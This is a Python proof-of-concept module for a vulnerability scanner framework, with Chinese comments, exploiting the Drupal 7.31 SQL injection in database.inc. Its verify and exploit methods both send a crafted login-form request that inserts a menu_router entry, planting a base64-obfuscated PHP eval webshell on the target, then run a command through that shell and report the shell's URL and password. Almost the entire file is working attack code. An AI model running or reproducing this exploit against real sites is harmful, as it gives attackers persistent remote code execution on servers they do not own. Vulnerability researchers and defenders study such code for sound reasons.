# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Drupal_0101'  # 平台漏洞编号，留空
    name = 'Drupal 7.31 GetShell via /includes/database/database.inc SQL Injection Exploit'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-10-21'  # 漏洞公布时间
    desc = '''
    漏洞分析：https://www.ricter.me/posts/Drupal%20%E7%9A%84%20callback%20%E5%99%A9%E6%A2%A6
    Drupal 7.31 /includes/database/database.inc在处理IN语句时，展开数组时key带入SQL语句导致SQL注入，可以添加管理员、造成信息泄露，利用特性也可 getshell。
    '''  # 漏洞描述
    ref = 'https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Drupal'  # 漏洞应用名称
    product_version = '<=7.31'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c8057e88-72b9-4c2e-a061-9bdd59774c39'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            webshell_url = url + \
                '/?q=<?php%20eval(base64_decode(ZXZhbCgkX1BPU1RbZV0pOw));?>'
            payload = "name[0;insert into menu_router (path,  page_callback, access_callback, " \
                "include_file, load_functions, to_arg_functions, description) values ('<" \
                "?php eval(base64_decode(ZXZhbCgkX1BPU1RbZV0pOw));?>','php_eval', '1', '" \
                "modules/php/php.module', '', '', '');#]=test&name[0]=test2&pass=test&fo" \
                "rm_id=user_login_block"
            urllib.request.urlopen(url, data=payload)
            request = urllib.request.Request(
                webshell_url, data="e=echo strrev(gwesdvjvncqwdijqiwdqwduhq);")
            response = str(urllib.request.urlopen(request).read())
            if 'gwesdvjvncqwdijqiwdqwduhq'[::-1] in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            webshell_url = url + \
                '/?q=<?php%20eval(base64_decode(ZXZhbCgkX1BPU1RbZV0pOw));?>'
            payload = "name[0;insert into menu_router (path,  page_callback, access_callback, " \
                "include_file, load_functions, to_arg_functions, description) values ('<" \
                "?php eval(base64_decode(ZXZhbCgkX1BPU1RbZV0pOw));?>','php_eval', '1', '" \
                "modules/php/php.module', '', '', '');#]=test&name[0]=test2&pass=test&fo" \
                "rm_id=user_login_block"
            urllib.request.urlopen(url, data=payload)
            request = urllib.request.Request(
                webshell_url, data="e=echo strrev(gwesdvjvncqwdijqiwdqwduhq);")
            response = str(urllib.request.urlopen(request).read())
            if 'gwesdvjvncqwdijqiwdqwduhq'[::-1] in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取到的信息:vul_url={url},Webshell={webshell_url}, Webshell_PWD=e'.format(
                    target=self.target, name=self.vuln.name, url=url, webshell_url=webshell_url))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
